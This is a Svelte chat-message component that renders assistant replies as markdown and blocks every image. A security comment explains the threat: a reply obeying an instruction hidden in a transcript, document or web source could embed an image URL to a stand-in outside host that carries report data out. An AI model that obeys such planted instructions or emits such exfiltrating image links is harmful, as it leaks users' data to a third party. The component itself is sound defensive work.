<script lang="ts">
  import type { Snippet } from "svelte";
  import { Streamdown } from "svelte-streamdown";
  import { cn } from "$lib/utils";
  import { getMessageRoleContext, type MessageRole } from "./context";

  /**
   * The message body. Role comes from the wrapping <Message> (overridable):
   * user = primary-tinted bubble, assistant = plain ink. `markdown` renders
   * `text` through svelte-streamdown (streaming-safe, `chat-markdown` CSS);
   * otherwise `children` (custom layout) or `text` as pre-wrapped plain text.
   */
  interface Props {
    /** Render `text` as markdown (assistant replies). */
    markdown?: boolean;
    /** Message text; alternative to children for simple content. */
    text?: string;
    /** Override the role inherited from <Message>. */
    role?: MessageRole;
    class?: string;
    children?: Snippet;
  }

  let { markdown = false, text = "", role, class: className, children }: Props = $props();

  // Security (2026-10-06): model output never loads an image. A reply that
  // follows an instruction hidden in a transcript, document or web source
  // could otherwise embed ![](https://outside.example/?d=...) and send report
  // data to that server just by being shown. Streamdown renders a blocked
  // image as "[Image blocked: alt]". Links stay http and https only (the
  // wildcard's own rule) and need a click.
  const NO_IMAGES: string[] = [];

  const inherited = getMessageRoleContext();
  const resolvedRole = $derived(role ?? inherited?.role ?? "assistant");

  const roleClass = $derived(
    resolvedRole === "user"
      ? "chat-fluid-text ml-auto w-fit max-w-[min(18.75rem,90%)] rounded-xl bg-gray-50 px-3.5 py-2.5 font-sans leading-[1.45] text-ink"
      : cn("chat-fluid-text leading-normal text-ink", markdown && "chat-markdown")
  );
</script>

<div class={cn(roleClass, className)}>
  {#if markdown}
    <Streamdown content={text} allowedImagePrefixes={NO_IMAGES} />
  {:else if children}
    {@render children()}
  {:else}
    <p class="whitespace-pre-wrap">{text}</p>
  {/if}
</div>
